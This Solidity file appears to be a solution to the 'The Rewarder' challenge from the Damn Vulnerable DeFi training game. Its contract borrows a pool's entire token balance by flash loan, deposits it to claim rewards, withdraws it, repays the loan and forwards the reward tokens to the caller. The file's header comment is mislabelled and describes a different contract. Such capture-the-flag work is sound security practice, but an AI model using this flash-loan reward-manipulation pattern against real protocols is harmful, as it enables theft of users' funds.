// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract RewarderFlashLoanReceiver {

    IFlashLoanPool public immutable pool;
    ITheRewarderPool public immutable rewarderPool;
    DamnValuableToken public immutable DVT;
    RewardToken public immutable RT;
    address owner;

    constructor(address _pool, address _rewarderPool, address _DVT, address _RT) {
        pool = IFlashLoanPool(_pool);
        rewarderPool = ITheRewarderPool(_rewarderPool);
        DVT = DamnValuableToken(_DVT);
        RT = RewardToken(_RT);
        owner = msg.sender;
    }


    function getRewards() external {
        uint256 balance = DVT.balanceOf(address(pool));

        /// approve `amount` tokens
        DVT.approve(address(rewarderPool), balance);
        /// get loan
        pool.flashLoan(balance);
        /// send reward tokens to EOA
        uint256 RTBalance = RT.balanceOf(address(this));
        require(RTBalance > 0, "Reward balance was 0");
        bool success = RT.transfer(msg.sender, RTBalance);
        require(success, "failed to transfer RT");
        
    }

    function receiveFlashLoan(uint256 amount) external {
        require(DVT.balanceOf(address(this)) == amount, "did not receive flashloan");
        /// request rewards
        rewarderPool.deposit(amount);
        
        require(DVT.balanceOf(address(this)) == 0, "did not deposit tokens");

        /// withdraw rewards
        rewarderPool.withdraw(amount);

        require(DVT.balanceOf(address(this)) == amount, "did not withdraw tokens");

        /// check balance
        // require();

        /// return loan
        DVT.transfer(address(pool),amount);
        require(DVT.balanceOf(address(this)) == 0, "did not return flashloan");

    }

}